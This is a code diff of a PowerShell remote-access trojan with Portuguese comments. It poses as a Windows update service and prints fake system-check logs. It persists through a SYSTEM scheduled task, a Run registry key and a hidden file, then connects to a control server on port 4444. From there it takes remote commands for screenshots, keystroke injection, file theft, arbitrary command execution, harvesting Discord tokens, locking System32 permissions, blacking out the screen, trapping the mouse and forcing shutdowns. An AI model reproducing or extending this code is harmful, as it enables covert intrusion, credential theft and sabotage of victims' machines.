@@ -13,7 +13,7 @@ $serverPort = 4444
 $installName = "WinUpdateSvc"
 $mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
 
-# ===== LOGS FAKES (SEM EMOJIS) =====
+# ===== LOGS FAKES (SEM CARACTERES ESPECIAIS) =====
 $fakeLogs = @(
     "[+] Inicializando modulo de verificacao do sistema...",
     "[+] Carregando bibliotecas de analise...",
@@ -135,94 +135,43 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-# ===== CAPTURA DE TELA =====
 function Get-ScreenCapture {
     try {
         $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
         $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-        
         $ms = New-Object System.IO.MemoryStream
         $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
         $graphics.Dispose()
         $bitmap.Dispose()
-        
         $base64 = [Convert]::ToBase64String($ms.ToArray())
         $ms.Dispose()
         return "SCREEN:$base64"
-    } catch {
-        return "SCREEN_ERROR"
-    }
+    } catch { return "SCREEN_ERROR" }
 }
 
-# ===== CONTROLE DE MOUSE =====
 function Move-Mouse { 
     param($x, $y)
-    try {
-        [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y)
-        return "OK"
-    } catch { 
-        return "MOUSE_ERROR" 
-    }
+    try { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]$x, [int]$y); return "OK" } 
+    catch { return "MOUSE_ERROR" }
 }
 
 function Click-Mouse {
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
-        return "OK"
-    } catch { 
-        return "CLICK_ERROR" 
-    }
+    try { [System.Windows.Forms.SendKeys]::SendWait("{ENTER}"); return "OK" } 
+    catch { return "CLICK_ERROR" }
 }
 
-function RightClick-Mouse {
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
-        return "OK"
-    } catch { 
-        return "RIGHTCLICK_ERROR" 
-    }
-}
-
-function DoubleClick-Mouse {
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait("{ENTER}{ENTER}")
-        return "OK"
-    } catch { 
-        return "DOUBLECLICK_ERROR" 
-    }
-}
-
-# ===== CONTROLE DE TECLADO =====
 function Send-Key {
     param($key)
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait($key)
-        return "OK"
-    } catch { 
-        return "KEY_ERROR" 
-    }
+    try { [System.Windows.Forms.SendKeys]::SendWait($key); return "OK" } 
+    catch { return "KEY_ERROR" }
 }
 
-function Send-Text {
-    param($text)
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait($text)
-        return "OK"
-    } catch { 
-        return "TEXT_ERROR" 
-    }
-}
-
-# ===== GERENCIADOR DE ARQUIVOS =====
 function Get-FileList {
     param($Path)
     try {
-        if (-not (Test-Path $Path)) {
-            return "[]"
-        }
-        
+        if (-not (Test-Path $Path)) { return "[]" }
         $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
             [PSCustomObject]@{
                 Name = $_.Name
@@ -233,9 +182,7 @@ function Get-FileList {
             }
         }
         return ($items | ConvertTo-Json -Compress)
-    } catch { 
-        return "[]" 
-    }
+    } catch { return "[]" }
 }
 
 function Download-File {
@@ -246,9 +193,7 @@ function Download-File {
             return "FILE:$content"
         }
         return "FILE_NOT_FOUND"
-    } catch { 
-        return "DOWNLOAD_ERROR" 
-    }
+    } catch { return "DOWNLOAD_ERROR" }
 }
 
 function Execute-Command {
@@ -257,12 +202,9 @@ function Execute-Command {
         $result = Invoke-Expression $Cmd 2>&1 | Out-String
         if ([string]::IsNullOrEmpty($result)) { $result = "Comando executado (sem saida)" }
         return $result
-    } catch {
-        return "Erro: $_"
-    }
+    } catch { return "Erro: $_" }
 }
 
-# ===== DISCORD TOKEN =====
 function Get-DiscordToken {
     try {
         $tokens = @()
@@ -271,31 +213,22 @@ function Get-DiscordToken {
             "$env:APPDATA\discordptb\Local Storage\leveldb",
             "$env:APPDATA\discordcanary\Local Storage\leveldb"
         )
-        
         foreach ($path in $paths) {
             if (Test-Path $path) {
                 Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                     $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                     $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
                     $matches = $regex.Matches($content)
-                    foreach ($match in $matches) {
-                        $tokens += $match.Value
-                    }
+                    foreach ($match in $matches) { $tokens += $match.Value }
                 }
             }
         }
-        
         $tokens = $tokens | Select-Object -Unique
-        if ($tokens.Count -eq 0) {
-            return "TOKENS:Nenhum token encontrado"
-        }
+        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
         return "TOKENS:" + ($tokens -join "`n")
-    } catch { 
-        return "TOKENS_ERROR" 
-    }
+    } catch { return "TOKENS_ERROR" }
 }
 
-# ===== FUNCOES DESTRUTIVAS =====
 function Block-System32 {
     try {
         $path = "C:\Windows\System32"
@@ -305,9 +238,7 @@ function Block-System32 {
         $acl.AddAccessRule($accessRule)
         Set-Acl $path $acl
         return "SYSTEM32_BLOCKED"
-    } catch {
-        return "SYSTEM32_ERROR"
-    }
+    } catch { return "SYSTEM32_ERROR" }
 }
 
 function Black-Screen {
@@ -319,9 +250,7 @@ function Black-Screen {
         $form.BackColor = 'Black'
         $form.ShowDialog()
         return "BLACK_SCREEN"
-    } catch {
-        return "BLACK_SCREEN_ERROR"
-    }
+    } catch { return "BLACK_SCREEN_ERROR" }
 }
 
 function Lock-Mouse {
@@ -344,9 +273,7 @@ function Lock-Mouse {
 "@
         [MouseTrap]::Trap()
         return "MOUSE_LOCKED"
-    } catch {
-        return "MOUSE_ERROR"
-    }
+    } catch { return "MOUSE_ERROR" }
 }
 
 function Power-Control {
@@ -357,39 +284,30 @@ function Power-Control {
             "reboot" { Restart-Computer -Force }
         }
         return "POWER_$Action"
-    } catch { 
-        return "POWER_ERROR" 
-    }
+    } catch { return "POWER_ERROR" }
 }
 
-# ===== PERSISTENCIA =====
 function Install-Persistence {
     $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-    
     New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
     Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
-    
     try {
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
         $trigger = New-ScheduledTaskTrigger -AtStartup
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
     } catch { }
-    
     try {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
     } catch { }
-    
     attrib +h +s +r $scriptPath
 }
 
-# ===== VERIFICAR INSTALACAO =====
 if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
     Install-Persistence
 }
 
-# ===== CONEXAO PRINCIPAL =====
 while ($true) {
     try {
         $client = New-Object System.Net.Sockets.TcpClient($serverIP, $serverPort)
@@ -397,8 +315,6 @@ while ($true) {
         $writer = New-Object System.IO.StreamWriter($stream)
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
-        
-        # ENVIA IDENTIFICACAO
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
         while ($client.Connected) {
@@ -406,110 +322,33 @@ while ($true) {
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
             switch -Wildcard ($cmd) {
-                # ===== TELA =====
-                "screenshot" { 
-                    $writer.WriteLine((Get-ScreenCapture))
-                }
-                
-                # ===== MOUSE =====
+                "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
                 "move *" { 
                     $pos = $cmd.Replace("move ","").Split(" ")
-                    if ($pos.Count -ge 2) {
-                        $writer.WriteLine((Move-Mouse $pos[0] $pos[1]))
-                    } else {
-                        $writer.WriteLine("MOVE_ERROR")
-                    }
+                    if ($pos.Count -ge 2) { $writer.WriteLine((Move-Mouse $pos[0] $pos[1])) }
                 }
-                "click" { 
-                    $writer.WriteLine((Click-Mouse))
+                "click" { $writer.WriteLine((Click-Mouse)) }
+                "key *" { $writer.WriteLine((Send-Key ($cmd.Replace("key ","")))) }
+                "ls *" { $writer.WriteLine((Get-FileList ($cmd.Replace("ls ","")))) }
+                "download *" { $writer.WriteLine((Download-File ($cmd.Replace("download ","")))) }
+                "exec *" { $writer.WriteLine((Execute-Command ($cmd.Replace("exec ","")))) }
+                "discord" { $writer.WriteLine((Get-DiscordToken)) }
+                "block_system32" { $writer.WriteLine((Block-System32)) }
+                "black_screen" { $writer.WriteLine((Black-Screen)) }
+                "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
+                "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
+                "reboot" { $writer.WriteLine((Power-Control "reboot")) }
+                "url *" { 
+                    try { Start-Process ($cmd.Replace("url ","")); $writer.WriteLine("URL_OPENED") } 
+                    catch { $writer.WriteLine("URL_ERROR") }
                 }
-                "rightclick" { 
-                    $writer.WriteLine((RightClick-Mouse))
+                "processes" { 
+                    try { $writer.WriteLine((Get-Process | Select-Object -First 20 Name, CPU, WorkingSet | ConvertTo-Json -Compress)) } 
+                    catch { $writer.WriteLine("PROCESS_ERROR") }
                 }
-                "doubleclick" { 
-                    $writer.WriteLine((DoubleClick-Mouse))
-                }
-                
-                # ===== TECLADO =====
-                "key *" { 
-                    $key = $cmd.Replace("key ","")
-                    $writer.WriteLine((Send-Key $key))
-                }
-                "type *" { 
-                    $text = $cmd.Replace("type ","")
-                    $writer.WriteLine((Send-Text $text))
-                }
-                
-                # ===== ARQUIVOS =====
-                "ls *" { 
-                    $path = $cmd.Replace("ls ","")
-                    $writer.WriteLine((Get-FileList $path))
-                }
-                "download *" { 
-                    $file = $cmd.Replace("download ","")
-                    $writer.WriteLine((Download-File $file))
-                }
-                "exec *" { 
-                    $exe = $cmd.Replace("exec ","")
-                    $writer.WriteLine((Execute-Command $exe))
-                }
-                
-                # ===== DADOS =====
-                "discord" {
-                    $writer.WriteLine((Get-DiscordToken))
-                }
-                
-                # ===== DESTRUTIVAS =====
-                "block_system32" {
-                    $writer.WriteLine((Block-System32))
-                }
-                "black_screen" {
-                    $writer.WriteLine((Black-Screen))
-                }
-                "lock_mouse" {
-                    $writer.WriteLine((Lock-Mouse))
-                }
-                "shutdown" {
-                    $writer.WriteLine((Power-Control "shutdown"))
-                }
-                "reboot" {
-                    $writer.WriteLine((Power-Control "reboot"))
-                }
-                
-                # ===== TESTE =====
-                "test" {
-                    $writer.WriteLine("PONG")
-                }
-                
-                # ===== URL =====
-                "url *" {
-                    $url = $cmd.Replace("url ","")
-                    try {
-                        Start-Process $url
-                        $writer.WriteLine("URL_OPENED")
-                    } catch {
-                        $writer.WriteLine("URL_ERROR")
-                    }
-                }
-                
-                # ===== PROCESSOS =====
-                "processes" {
-                    try {
-                        $procs = Get-Process | Select-Object -First 20 Name, CPU, WorkingSet | ConvertTo-Json -Compress
-                        $writer.WriteLine($procs)
-                    } catch {
-                        $writer.WriteLine("PROCESS_ERROR")
-                    }
-                }
-                
-                # ===== SAIR =====
-                "exit" { 
-                    break 
-                }
-                
-                default { 
-                    $writer.WriteLine("Comando nao reconhecido: $cmd")
-                }
+                "test" { $writer.WriteLine("PONG") }
+                "exit" { break }
+                default { $writer.WriteLine("Comando nao reconhecido: $cmd") }
             }
         }
     } catch {
